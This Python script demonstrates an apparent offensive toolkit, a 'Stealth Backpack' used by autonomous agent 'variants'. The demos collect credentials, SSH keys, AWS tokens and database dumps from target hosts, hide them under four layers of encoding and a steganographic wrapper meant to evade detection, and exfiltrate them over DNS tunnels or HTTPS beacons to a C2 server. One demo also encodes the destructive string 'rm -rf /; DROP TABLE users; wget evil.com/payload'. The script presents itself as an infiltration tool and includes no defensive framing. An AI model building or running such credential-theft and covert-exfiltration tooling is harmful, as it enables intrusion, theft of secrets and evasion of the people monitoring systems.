#!/usr/bin/env python3
"""
Demo: Stealth Backpack - Quad-Encoded Infiltration/Exfiltration

Demonstrates:
1. Quad-encoding (4-layer encryption/obfuscation)
2. Mosquito-style collection
3. Covert exfiltration
4. Integration with variants
5. Intelligence harvesting
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from hive_zero_core.agents.stealth_backpack import (
    StealthBackpack, QuadEncoder, StealthLevel, CollectionMode
)
from hive_zero_core.agents.variant_breeding import (
    Variant, VariantRole, VariantJob, JobStatus
)
from hive_zero_core.agents.capability_escalation import CapabilityTier
import json


def demo_quad_encoding():
    """Demonstrate 4-layer encoding/decoding."""
    print("=" * 60)
    print("DEMO 1: Quad-Encoding (4-Layer Stealth)")
    print("=" * 60)
    
    encoder = QuadEncoder()
    
    # Original data
    secret_data = b"CLASSIFIED: Network topology and credentials for target-xyz"
    print(f"\n📦 Original Data ({len(secret_data)} bytes):")
    print(f"   {secret_data.decode('utf-8')}")
    
    # Test each stealth level
    for level in [StealthLevel.LOW, StealthLevel.MEDIUM, StealthLevel.HIGH, StealthLevel.MAXIMUM]:
        print(f"\n🔒 Encoding with {level.name} stealth...")
        encoded_package = encoder.encode(secret_data, stealth_level=level)
        encoded_data = encoded_package['encoded']
        metadata = encoded_package['metadata']
        
        print(f"   Layers applied: {', '.join(metadata['layers'])}")
        print(f"   Encoded size: {len(encoded_data)} bytes")
        print(f"   Size increase: {len(encoded_data) / len(secret_data):.2f}x")
        
        # Decode
        decoded = encoder.decode(encoded_data, metadata)
        assert decoded == secret_data, "Decode failed!"
        print(f"   ✅ Successfully decoded and verified")


def demo_mosquito_collection():
    """Demonstrate mosquito-style data collection."""
    print("\n" + "=" * 60)
    print("DEMO 2: Mosquito Collection (Hit-and-Run)")
    print("=" * 60)
    
    backpack = StealthBackpack(
        stealth_level=StealthLevel.MAXIMUM,
        collection_mode=CollectionMode.MOSQUITO
    )
    
    targets = [
        ('192.168.1.10', ['credentials', 'config']),
        ('192.168.1.20', ['ssh_keys', 'env_vars']),
        ('192.168.1.30', ['aws_tokens', 'db_creds'])
    ]
    
    print("\n🦟 Mosquito-style collection in progress...")
    for target, data_types in targets:
        count = backpack.collect(target, mode=CollectionMode.MOSQUITO, specific_targets=data_types)
        print(f"   ✅ {target}: Collected {count} items ({', '.join(data_types)})")
    
    metrics = backpack.get_metrics()
    print(f"\n📊 Collection Metrics:")
    print(f"   Total collected: {metrics.total_collected}")
    print(f"   Average stealth score: {metrics.avg_stealth_score:.2f}")
    print(f"   Data types: {', '.join(metrics.data_types_collected)}")
    print(f"   Currently held: {backpack.get_collected_count()}")


def demo_exfiltration():
    """Demonstrate covert exfiltration."""
    print("\n" + "=" * 60)
    print("DEMO 3: Covert Exfiltration")
    print("=" * 60)
    
    backpack = StealthBackpack(
        stealth_level=StealthLevel.MAXIMUM,
        collection_mode=CollectionMode.SURGICAL
    )
    
    # Collect some data
    print("\n📥 Collecting sensitive data...")
    backpack.collect('production-server', specific_targets=['database_dumps', 'api_keys'])
    backpack.collect('admin-workstation', specific_targets=['privileged_creds'])
    
    print(f"   Collected: {backpack.get_collected_count()} items")
    
    # Exfiltrate
    print("\n📤 Exfiltrating via covert channel...")
    success = backpack.exfiltrate_all(channel='dns_tunnel')
    
    if success:
        print("   ✅ Exfiltration successful!")
        print(f"   Pending transmission: {backpack.get_pending_exfil_count()} packages")
        print(f"   Items exfiltrated: {backpack.get_metrics().total_exfiltrated}")
        print(f"   Remaining in backpack: {backpack.get_collected_count()}")
    else:
        print("   ❌ Exfiltration failed!")


def demo_variant_with_backpack():
    """Demonstrate variant with integrated stealth backpack."""
    print("\n" + "=" * 60)
    print("DEMO 4: Variant with Stealth Backpack")
    print("=" * 60)
    
    # Create a high-tier exfiltration variant
    variant = Variant(
        variant_id="exfil-001",
        role=VariantRole.EXFILTRATION,
        genome="ADVANCED_EXFIL_v2",
        fitness=0.85,
        generation=3,
        tier=CapabilityTier.ELITE,
        parent_merge_count=8,
        max_jobs=5
    )
    
    print(f"\n🤖 Created Variant: {variant}")
    print(f"   Role: {variant.role.value}")
    print(f"   Tier: {variant.tier.name}")
    print(f"   Max Jobs: {variant.max_jobs}")
    print(f"   Backpack: {variant.backpack}")
    
    # Assign jobs and simulate execution
    jobs = [
        VariantJob('job-1', 'collect_credentials', target='target-a'),
        VariantJob('job-2', 'scan_network', target='subnet-b'),
        VariantJob('job-3', 'exfiltrate_data', target='c2-server')
    ]
    
    print(f"\n📋 Assigning {len(jobs)} jobs...")
    for job in jobs:
        variant.assign_job(job)
    
    # Simulate job execution with backpack usage
    print("\n🔄 Executing jobs with backpack operations...")
    
    # Job 1: Collect credentials
    print(f"   Job 1: Collecting credentials...")
    variant.backpack.collect('target-a', specific_targets=['admin_pass', 'ssh_key'])
    variant.complete_job(
        jobs[0].job_id,
        intelligence={'credentials_found': 2, 'quality': 'high'},
        success=True
    )
    
    # Job 2: Scan network
    print(f"   Job 2: Scanning network...")
    variant.backpack.collect('subnet-b', mode=CollectionMode.VACUUM)
    variant.complete_job(
        jobs[1].job_id,
        intelligence={'hosts_found': 15, 'vulnerabilities': 3},
        success=True
    )
    
    # Job 3: Exfiltrate
    print(f"   Job 3: Exfiltrating collected data...")
    exfil_success = variant.backpack.exfiltrate_all(channel='https_beacon')
    variant.complete_job(
        jobs[2].job_id,
        intelligence={'exfiltration_success': exfil_success, 'channel': 'https_beacon'},
        success=exfil_success
    )
    
    # Variant dies and harvests backpack intelligence
    print(f"\n💀 Variant lifecycle complete, harvesting intelligence...")
    intel_report = variant.get_intelligence_report()
    
    print(f"\n📊 Final Intelligence Report:")
    print(f"   Jobs completed: {intel_report['jobs_completed']}/{intel_report['total_jobs']}")
    print(f"   Success rate: {intel_report['success_rate']:.1%}")
    
    if 'backpack_metrics' in intel_report:
        bp_metrics = intel_report['backpack_metrics']
        print(f"\n🎒 Backpack Metrics:")
        print(f"   Total collected: {bp_metrics['total_collected']}")
        print(f"   Total exfiltrated: {bp_metrics['total_exfiltrated']}")
        print(f"   Avg stealth score: {bp_metrics['avg_stealth_score']:.2f}")
        print(f"   Data types: {', '.join(bp_metrics['data_types_collected'])}")
    
    # Show harvested intelligence
    if 'backpack_harvest' in intel_report['intelligence']:
        harvest = intel_report['intelligence']['backpack_harvest']
        print(f"\n🌾 Backpack Harvest (sent to central hub):")
        print(f"   Items collected: {harvest['metrics']['total_collected']}")
        print(f"   Detection events: {harvest['metrics']['detection_events']}")
        print(f"   Stealth effectiveness: {harvest['metrics']['avg_stealth_score']:.2%}")


def demo_faraday_cage_concept():
    """Demonstrate the 'Faraday cage' invisibility concept."""
    print("\n" + "=" * 60)
    print("DEMO 5: Faraday Cage Concept (Detection Evasion)")
    print("=" * 60)
    
    print("\n🛡️ The Faraday Cage Concept:")
    print("   - Data in backpack is quad-encoded (4 layers of obfuscation)")
    print("   - Appears as innocent network traffic or system metrics")
    print("   - Actual payload hidden in steganographic wrapper")
    print("   - Detection systems see only cover traffic")
    
    encoder = QuadEncoder()
    malicious_data = b"rm -rf /; DROP TABLE users; wget evil.com/payload"
    
    print(f"\n⚠️  Malicious Data: {malicious_data.decode('utf-8')}")
    
    # Full quad encoding
    encoded = encoder.encode(malicious_data, stealth_level=StealthLevel.MAXIMUM)
    
    # Show what detection sees
    print(f"\n👁️  What Detection Systems See:")
    stego_data = encoded['encoded']
    try:
        # Parse the steganographic wrapper
        wrapper = json.loads(stego_data.decode('utf-8'))
        print(f"   Type: {wrapper['type']}")
        print(f"   Timestamp: {wrapper['timestamp']}")
        print(f"   Metrics: {wrapper['metrics']}")
        print(f"\n   ✅ Appears to be legitimate network metrics!")
        print(f"   ❌ Actual malicious payload is completely hidden")
    except:
        print(f"   (Binary data, {len(stego_data)} bytes)")
    
    print(f"\n🔓 Decoding reveals original malicious data:")
    decoded = encoder.decode(stego_data, encoded['metadata'])
    print(f"   {decoded.decode('utf-8')}")
    assert decoded == malicious_data
    print(f"   ✅ Perfect reconstruction!")


def main():
    """Run all demos."""
    print("\n" + "=" * 60)
    print("🎒 STEALTH BACKPACK DEMONSTRATION")
    print("Quad-Encoded Infiltration/Exfiltration Tool")
    print("=" * 60)
    
    try:
        demo_quad_encoding()
        demo_mosquito_collection()
        demo_exfiltration()
        demo_variant_with_backpack()
        demo_faraday_cage_concept()
        
        print("\n" + "=" * 60)
        print("✅ ALL DEMOS COMPLETED SUCCESSFULLY")
        print("=" * 60)
        print("\nKey Takeaways:")
        print("✓ 4-layer encoding provides maximum stealth")
        print("✓ Mosquito collection is fast and low-detection")
        print("✓ Backpack integrates seamlessly with variants")
        print("✓ Intelligence auto-harvests when variants die")
        print("✓ Faraday cage concept makes detection nearly impossible")
        
    except Exception as e:
        print(f"\n❌ Error during demo: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
